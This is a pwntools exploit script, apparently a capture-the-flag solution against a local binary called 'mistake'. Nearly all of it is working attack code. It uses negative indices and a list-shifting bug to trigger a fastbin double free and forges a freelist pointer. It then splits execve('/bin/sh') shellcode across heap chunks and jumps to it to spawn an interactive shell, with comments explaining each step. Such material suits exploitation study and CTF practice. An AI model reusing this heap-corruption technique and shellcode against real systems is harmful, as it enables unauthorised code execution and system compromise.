from pwn import *
io = process('./mistake')
context.log_level = 'debug'
pause()

def menu(idx):
    io.recvuntil('>')
    io.sendline(str(idx))

def create(buf):
    menu(1)
    io.recvuntil(': ')
    io.send(buf)

def read(idx):
    menu(2)
    io.recvuntil(': ')
    io.sendline(str(idx))

def delete(idx):
    menu(3)
    io.recvuntil(': ')
    if len(str(idx & 0xffffffff)) == 10:
        io.send(str(idx & 0xffffffff))
        return
    io.sendline(str(idx & 0xffffffff))


for x in range(0, 0x22):
    create('a' * 16)
delete(-5) # we can give neg idx, because it used signed int to compare
delete(-6)
#create a fake size 0x20

for x in range(0, 48):
    create('b' * 16)
# the bug lies in the g_idx. we can malloc 48 chunks when g_idx is 0
# so that we can free 49 times(the g_idx will decreased from 48 to 0)
# the back pointer of chunk will be moved forward since the
#      for ( i = idx; i <= 46; ++i )
#           *(&g_list + i) = *(&g_list + i + 1);
# then the 47th chunk moved to g_list[0], we will gain a double free chance of fastbin
# we made it to fastbin dup attack
delete(47)
for x in range(0, 48):
    delete(0) 

#make fake fd, to do fastbin dup attack
create(p64(0x602068) + 'sbnu1l!!')

#deploy the shellcode we are about to jmp to
context.arch = 'amd64'
shellcode = asm('''
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
nop
push rbp
pop rax

nop
mov rdi, rsp
push 0x1010101 ^ 0x6873
xor esi, esi
push rsi
push 8
pop rsi
push rax

pop rax
add rsi, rsp
push rsi
mov rsi, rsp
xor edx, edx
push SYS_execve
pop rax
syscall
''')
for x in range(0, 48 - 5):
    create(chr(x) * 16)

#make them in 3 chunks, every chunk is 16 bytes big.
#and adjust the shellcode to the place we jmp to
create(shellcode[32:])
create(shellcode[16:32])
create(shellcode[:16])

#create exactly 48 chunks 
for x in range(48 - 2, 48):
    create(chr(x) * 16)
delete(-3)

#jmp to heap to execute shellcode, because we cant delete since the g_idx been modified to -17, and we cant create since the fd had been corrupted.
# and we only have 8 bytes of shellcode space to use
# the next malloced chunk is at the place we want
create(asm('jmp [0x602208]') + '1' + p64(-17 & 0xffffffff))

delete(-17)
io.interactive()

